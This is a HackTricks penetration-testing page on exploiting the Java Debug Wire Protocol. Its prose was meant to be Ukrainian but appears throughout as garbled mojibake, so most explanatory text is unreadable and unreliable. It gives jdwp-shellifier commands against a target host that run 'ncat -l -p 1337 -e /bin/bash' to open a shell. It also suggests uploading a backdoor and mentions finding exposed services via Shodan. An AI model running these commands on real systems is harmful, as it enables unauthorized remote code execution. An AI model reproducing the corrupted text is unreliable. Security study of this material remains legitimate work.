# Pentesting JDWP - Java Debug Wire Protocol

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Exploiting

JDWP –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ **–≤—ñ–¥—Å—É—Ç–Ω–æ—Å—Ç—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è** –ø—Ä–æ—Ç–æ–∫–æ–ª—É. –ó–∞–∑–≤–∏—á–∞–π –≤—ñ–Ω –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ **–ø–æ—Ä—Ç—ñ 8000**, –∞–ª–µ –º–æ–∂–ª–∏–≤—ñ –π —ñ–Ω—à—ñ –ø–æ—Ä—Ç–∏. –ü–æ—á–∞—Ç–∫–æ–≤–µ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è "JDWP-Handshake" –Ω–∞ —Ü—ñ–ª—å–æ–≤–∏–π –ø–æ—Ä—Ç. –Ø–∫—â–æ —Å–ª—É–∂–±–∞ JDWP –∞–∫—Ç–∏–≤–Ω–∞, –≤–æ–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ç–∏–º –∂–µ —Ä—è–¥–∫–æ–º, –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—é—á–∏ —Å–≤–æ—é –ø—Ä–∏—Å—É—Ç–Ω—ñ—Å—Ç—å. –¶–µ–π —Ö–µ–Ω–¥—à–µ–π–∫ –¥—ñ—î —è–∫ –º–µ—Ç–æ–¥ –≤—ñ–¥–±–∏—Ç–∫—ñ–≤ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Å–ª—É–∂–± JDWP –≤ –º–µ—Ä–µ–∂—ñ.

–©–æ–¥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø—Ä–æ—Ü–µ—Å—ñ–≤, –ø–æ—à—É–∫ —Ä—è–¥–∫–∞ "jdwk" —É –ø—Ä–æ—Ü–µ—Å–∞—Ö Java –º–æ–∂–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –∞–∫—Ç–∏–≤–Ω—É —Å–µ—Å—ñ—é JDWP.

–û—Å–Ω–æ–≤–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç - [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
–Ø –≤–∏—è–≤–∏–≤, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `--break-on 'java.lang.String.indexOf'` —Ä–æ–±–∏—Ç—å –µ–∫—Å–ø–ª–æ–π—Ç –±—ñ–ª—å—à **—Å—Ç–∞–±—ñ–ª—å–Ω–∏–º**. –Ü —è–∫—â–æ —É –≤–∞—Å —î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –±–µ–∫–¥–æ—Ä –Ω–∞ —Ö–æ—Å—Ç —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏, –µ–∫—Å–ø–ª–æ–π—Ç –±—É–¥–µ —â–µ –±—ñ–ª—å—à —Å—Ç–∞–±—ñ–ª—å–Ω–∏–º.

## –ë—ñ–ª—å—à–µ –¥–µ—Ç–∞–ª–µ–π

**–¶–µ —Ä–µ–∑—é–º–µ –∑ [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –π–æ–≥–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –¥–µ—Ç–∞–ª–µ–π.

1. **–û–≥–ª—è–¥ JDWP**:
- –¶–µ –ø–∞–∫–µ—Ç–Ω–∏–π –º–µ—Ä–µ–∂–µ–≤–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª, –ø–µ—Ä–µ–≤–∞–∂–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∏–π.
- –ù–µ –º–∞—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º –ø—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—ñ –¥–æ –≤–æ—Ä–æ–∂–∏—Ö –º–µ—Ä–µ–∂.

2. **–†—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è JDWP**:
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç–∏–π –ø—Ä–æ—Ü–µ—Å —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è –¥–ª—è —ñ–Ω—ñ—Ü—ñ–∞—Ü—ñ—ó –∑–≤'—è–∑–∫—É. –û–±–º—ñ–Ω—é—î—Ç—å—Å—è 14-—Å–∏–º–≤–æ–ª—å–Ω–∏–π ASCII —Ä—è–¥–æ–∫ ‚ÄúJDWP-Handshake‚Äù –º—ñ–∂ –î–µ–±–∞–≥–µ—Ä–æ–º (–∫–ª—ñ—î–Ω—Ç–æ–º) —Ç–∞ –î–µ–±–∞–≥–æ–≤–∞–Ω–∏–º (—Å–µ—Ä–≤–µ—Ä–æ–º).

3. **–ö–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è JDWP**:
- –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –º–∞—é—Ç—å –ø—Ä–æ—Å—Ç—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∑ –ø–æ–ª—è–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ –î–æ–≤–∂–∏–Ω–∞, –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä, –ü—Ä–∞–ø–æ—Ä —Ç–∞ CommandSet.
- –ó–Ω–∞—á–µ–Ω–Ω—è CommandSet –≤–∞—Ä—ñ—é—é—Ç—å—Å—è –≤—ñ–¥ 0x40 –¥–æ 0x80, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—á–∏ —Ä—ñ–∑–Ω—ñ –¥—ñ—ó —Ç–∞ –ø–æ–¥—ñ—ó.

4. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**:
- JDWP –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ç–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –∫–ª–∞—Å–∏ —Ç–∞ –±–∞–π—Ç-–∫–æ–¥, —â–æ —Å—Ç–≤–æ—Ä—é—î —Ä–∏–∑–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏.
- –°—Ç–∞—Ç—Ç—è –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å—É—î –ø—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤ –ø'—è—Ç–∏ –∫—Ä–æ–∫–∞—Ö, —â–æ –≤–∫–ª—é—á–∞—î –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ—Å–∏–ª–∞–Ω—å –Ω–∞ Java Runtime, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–æ—á–æ–∫ –∑—É–ø–∏–Ω–∫–∏ —Ç–∞ –≤–∏–∫–ª–∏–∫ –º–µ—Ç–æ–¥—ñ–≤.

5. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É –∂–∏—Ç—Ç—ñ**:
- –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –∑–∞—Ö–∏—Å—Ç–∏ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞, —Å–µ—Ä–≤—ñ—Å–∏ JDWP –º–æ–∂–Ω–∞ –≤–∏—è–≤–∏—Ç–∏ —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –ø–æ—à—É–∫–∞—Ö –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ ShodanHQ —Ç–∞ GitHub.
- –°–∫—Ä–∏–ø—Ç –µ–∫—Å–ø–ª–æ–π—Ç—É –±—É–≤ –ø—Ä–æ—Ç–µ—Å—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö JDK —ñ —î –Ω–µ–∑–∞–ª–µ–∂–Ω–∏–º –≤—ñ–¥ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –Ω–∞–¥—ñ–π–Ω–µ –≤—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (RCE).

6. **–ë–µ–∑–ø–µ–∫–æ–≤—ñ –Ω–∞—Å–ª—ñ–¥–∫–∏**:
- –ù–∞—è–≤–Ω—ñ—Å—Ç—å –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤ JDWP –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –±–µ–∑–ø–µ–∫–∏, –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –≤ –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ —Ç–∞ –Ω–∞–ª–µ–∂–Ω–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞.

### **–ü–æ—Å–∏–ª–∞–Ω–Ω—è:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
